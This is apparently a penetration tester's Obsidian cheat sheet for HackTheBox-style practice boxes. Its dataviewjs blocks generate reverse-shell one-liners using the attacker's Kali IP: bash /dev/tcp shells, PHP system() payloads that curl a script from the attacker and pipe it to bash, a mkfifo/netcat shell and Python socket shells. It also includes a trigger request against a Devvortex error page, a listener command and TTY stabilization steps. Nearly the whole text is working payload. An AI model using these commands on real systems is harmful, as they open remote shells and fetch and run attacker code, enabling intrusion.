One liner reverse-shell

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/LISTENING_PORT 0>&1'`;

dv.paragraph("```bash\n" + command + "\n```");
```

PHP METHOD 1

system() function to run curl and fetch a bash script from our local web server, which is then piped to bash , triggering a reverse shell.
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?php system("curl ${KaliIP}:8080/rev.sh|bash;"); ?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Templater/IP");
const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `echo -e '#!/bin/bash\\nsh -i >& /dev/tcp/${KaliIP}/4444 0>&1' > rev.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```

Output rev.sh
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `#!/bin/bash
sh -i >& /dev/tcp/${KaliIP}/4444 0>&1`;

dv.paragraph("```bash\n" + command + "\n```");
```
Trigger the reverse-shell
```
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

PHP METHOD 2

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
# 🎯 Step 2 — From Web Shell (Target)

If it’s a Linux box (Bashed is), use:

```
bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
```

Example:

bash -c "bash -i >& /dev/tcp/10.10.16.35/4444 0>&1"

---

# 🔁 If `/dev/tcp` Fails

Try Python (very reliable):
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${KaliIP}",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;

dv.paragraph("```bash\n" + command + "\n```");
```
If only python2 exists:
```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${KaliIP}",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

# 🎯 Step 3 — Stabilize the Shell

Once connected:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

CTRL + Z  

```
stty raw -echo
```

```
fg
```

ENTER

```
export TERM=xterm
```

ENTER 

Now you have a proper TTY.